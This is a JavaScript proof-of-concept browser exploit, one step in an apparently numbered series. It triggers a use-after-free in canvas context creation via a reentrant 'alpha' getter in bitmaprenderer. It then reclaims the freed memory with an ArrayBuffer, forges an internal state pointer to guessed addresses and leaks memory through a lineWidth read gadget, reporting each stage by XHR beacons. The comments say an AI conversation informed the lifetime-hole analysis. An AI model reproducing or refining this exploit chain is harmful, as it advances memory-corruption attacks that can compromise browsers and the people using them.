// p491 — M-probe: thief discriminator + continued forged-state leak ladder
//
// Built on the lifetime-hole analysis (opencode/GLM conversation):
//   - bitmaprenderer variant = cleanest trigger (no post-conversion existence check);
//     4th-console #12 confirmed 'alpha' getter reentrancy fires.
//   - "The first post-free allocation is the poisoner: it decides what the slot
//     contains." M-model for the identity read via the stale wrapper:
//       returns tc  -> slot UNTOUCHED (nothing reclaimed, no thief)
//       faults      -> a foreign allocation (thief) took the slot before JS resumed
//       returns nc  -> a same-type context reclaimed it (R2-proven path)
//   - Therefore: read inner.canvas FIRST, with ZERO allocations since getContext
//     returned. Its outcome decides whether the AB strategy can work at all.
//   - Then: LIFO ArrayBuffer reclaim + forged m_stateStack + lineWidth gadget,
//     candidate ladder CONTINUES from p490's localStorage cursor ('p490cand').
//
// Beacon chain: BOOT, TRIG, SLOT-STATE (NONE|RECLAIMED|?), AB, FORGED, LEAK, DONE
// Absence of SLOT-STATE after TRIG = thief took the slot (M1) — that is a RESULT.

(function() {
  var BASE = location.protocol + '//' + location.host;
  var T0 = Date.now();
  var staged = [];
  ['BOOT','TRIG','SLOT-STATE','AB','FORGED','LEAK','DONE','HTMLERR'].forEach(function(n){
    var x = new XMLHttpRequest();
    x.open('POST', BASE + '/beacon/V491-' + n);
    staged.push([n, x]);
  });
  function S(name, body) {
    try {
      for (var i = 0; i < staged.length; i++)
        if (staged[i][0] === name) { staged[i][1].send('[' + (Date.now()-T0) + 'ms] ' + (body||'')); return; }
    } catch(e) {}
  }

  var CANDS = [0x7EF5A8000, 0x7EF000000, 0x7F0000000, 0x10000000, 0x30000000,
               0x7E0000000, 0x50000000, 0x40000000];
  var idx = 0;
  try {
    idx = parseInt(localStorage.getItem('p490cand') || '0', 10);
    if (isNaN(idx) || idx < 0) idx = 0;
    if (idx >= CANDS.length) idx = CANDS.length - 1;   // keep re-trying the last zone
    localStorage.setItem('p490cand', String(idx + 1));
  } catch(e) {}
  var CAND = CANDS[idx];
  S('BOOT', 'cand=0x' + CAND.toString(16) + ' idx=' + idx + ' ' + navigator.userAgent);

  // ---- Stage 1: the UAF via the CLEANEST variant (bitmaprenderer + alpha getter).
  //      C1 (the 2D context) is created and destroyed INSIDE this call. ----
  var tc = document.createElement('canvas');
  var inner = null;
  var dctx = tc.getContext('bitmaprenderer', {
    get alpha() { inner = tc.getContext('2d'); return true; }
  });

  // ---- Stage 2: THE DISCRIMINATOR. Zero allocations since return.
  //      One property read through the stale wrapper. ----
  var slotState = 'FAULTED';
  var ident = (inner && inner.canvas === tc);   // may fault = thief (M1)
  slotState = ident ? 'NONE-untouched' : 'RECLAIMED-or-moved';
  S('TRIG', 'inner=' + (!!inner) + ' dctx=' + (!!dctx));
  S('SLOT-STATE', slotState);

  // ---- Stage 3: LIFO AB reclaim + forge (as p490) ----
  var ab = new ArrayBuffer(768);
  S('AB', 'allocated-768');
  var dv = new DataView(ab);
  dv.setUint32(0x70, CAND, true);
  dv.setUint32(0x74, 0, true);
  dv.setUint32(0x78, 1, true);
  dv.setUint32(0x7C, 1, true);
  S('FORGED', 'buf=0x' + CAND.toString(16) + ' cap=1 size=1 slot=' + slotState);

  // ---- Stage 4: the read gadget ----
  var v = inner.lineWidth;
  var f = new ArrayBuffer(8), fv = new DataView(f);
  fv.setFloat64(0, v, true);
  var hi = fv.getUint32(0, true), lo = fv.getUint32(4, true);
  S('LEAK', 'lineWidth=' + v + ' bits=0x' + hi.toString(16).padStart(8,'0') + lo.toString(16).padStart(8,'0'));
  S('DONE', 'gadget-ok');
})();
